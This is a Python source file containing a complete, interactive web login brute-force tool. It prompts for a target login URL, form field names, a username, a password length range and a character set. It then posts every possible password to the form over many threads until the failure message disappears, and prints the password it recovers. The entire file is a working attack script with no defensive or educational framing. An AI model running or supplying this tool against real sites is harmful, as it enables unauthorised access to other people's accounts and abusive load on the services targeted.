import itertools
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

def generate_passwords(length, charset):
    return (''.join(p) for p in itertools.product(charset, repeat=length))

def attempt_login(session, url, user_field, pw_field, username, password, stop_event, failure_indicator):
    if stop_event.is_set():
        return None
    data = {user_field: username, pw_field: password}
    try:
        r = session.post(url, data=data, timeout=5)
    except requests.RequestException:
        return None
    if failure_indicator not in r.text:
        stop_event.set()
        return password
    return None

def web_brute_force(
    url, username, user_field, pw_field,
    min_len, max_len, failure_indicator,
    charset,
    max_workers=20, chunk_size=1000
):
    stop_event = threading.Event()
    for length in range(min_len, max_len + 1):
        total = len(charset) ** length
        print(f"\n[+] Trying length={length}: {total:,} combos")
        pw_iter = generate_passwords(length, charset)
        with ThreadPoolExecutor(max_workers=max_workers) as exec:
            futures = {}
            while not stop_event.is_set():
                batch = list(itertools.islice(pw_iter, chunk_size))
                if not batch:
                    break
                for pw in batch:
                    session = requests.Session()
                    fut = exec.submit(
                        attempt_login,
                        session, url, user_field, pw_field,
                        username, pw, stop_event, failure_indicator
                    )
                    futures[fut] = pw
                for fut in as_completed(list(futures)):
                    result = fut.result()
                    pw = futures.pop(fut)
                    if result:
                        print(f"\n[✓] SUCCESS: password is '{result}'")
                        return result
        if stop_event.is_set():
            break
    print("[-] No password found.")
    return None

if __name__ == "__main__":
    print("=== Web Login Brute-Force Tool ===")
    url         = input("Target login URL: ").strip()
    user_field  = input("Username form field name: ").strip()
    pw_field    = input("Password form field name: ").strip()
    username    = input("Username to test: ").strip()

    length_input = input("Password length (e.g. '4' or '3-5'): ").strip()
    if '-' in length_input:
        min_len, max_len = map(int, length_input.split('-', 1))
    else:
        min_len = max_len = int(length_input)

    failure_indicator = input(
        "Text that appears on FAILED login (e.g. 'Invalid credentials'): "
    ).strip() or "invalid"

    # Charset choice
    print("\nChoose your charset:")
    print("  n) Numbers only (0–9)")
    print("  l) Letters only (a–z, A–Z)")
    print("  ln) Alphanumeric (0–9, a–z, A–Z)")
    choice = input("Enter n, l, or ln: ").strip().lower()
    if choice == 'n':
        charset = string.digits
    elif choice == 'l':
        charset = string.ascii_letters
    elif choice == 'ln':
        charset = string.digits + string.ascii_letters
    else:
        print("Invalid choice, defaulting to alphanumeric.")
        charset = string.digits + string.ascii_letters

    print("\n[!] Starting brute-force—press Ctrl+C to stop.\n")
    web_brute_force(
        url=url,
        username=username,
        user_field=user_field,
        pw_field=pw_field,
        min_len=min_len,
        max_len=max_len,
        failure_indicator=failure_indicator,
        charset=charset,
        max_workers=30,
        chunk_size=500
    )
